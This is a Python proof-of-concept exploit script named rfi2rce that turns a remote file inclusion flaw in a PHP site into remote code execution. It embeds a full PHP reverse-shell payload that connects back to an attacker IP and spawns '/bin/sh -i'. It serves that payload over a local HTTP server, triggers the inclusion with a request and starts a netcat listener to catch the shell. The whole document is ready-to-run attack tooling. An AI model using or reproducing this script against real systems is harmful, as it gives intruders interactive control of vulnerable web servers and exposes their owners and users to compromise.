#!/usr/bin/python3

# rfi2rce PoC by 0bfxgh0st*

import http.server
import socketserver
import requests
import time
import threading
import sys
import os

print('rfi2rce - Remote File Inclusion To Remote Code Execution v1.0 by 0bfxgh0st*')

def help():

	print('Usage python3 rfi2rce <url> <attacker ip> <attacker port> <attacker server port>')
	print('Example: python3 rfi2rce http://ghost.server/index.php?page= 10.0.2.15 1337 8080')

try:
	attacker_ip=sys.argv[2]
	attacker_port=sys.argv[3]
	attacker_server_port=int(sys.argv[4])
	attacker_url='http://' + attacker_ip + ':' + str(attacker_server_port) + '/payload.php'
except:
	help()
	sys.exit()

url = sys.argv[1] + attacker_url

payload = '''
<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = "''' + attacker_ip + '''";
$port = ''' + attacker_port + ''';
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\\n";
        }
}

?>
'''

f = open('payload.php','w')
f.write(payload)
f.close()

def Request():

	requests.get(url)

def autocon():

	os.system('nc -lvp ' + attacker_port)

def http_server():

	socketserver.TCPServer.allow_reuse_address = True
	Handler = http.server.SimpleHTTPRequestHandler
	httpd = socketserver.TCPServer(("", attacker_server_port), Handler)
	httpd.serve_forever()

try:
	requests.get(sys.argv[1])
except:
	print('ConnectionRefusedError: [Errno 111] Connection refused in ' + sys.argv[1])
	sys.exit(1)

print ('HTTP server on ' + str(attacker_server_port))
a = threading.Thread(target=autocon)
b = threading.Thread(target=Request)
a.start()
time.sleep(3)
b.start()
http_server()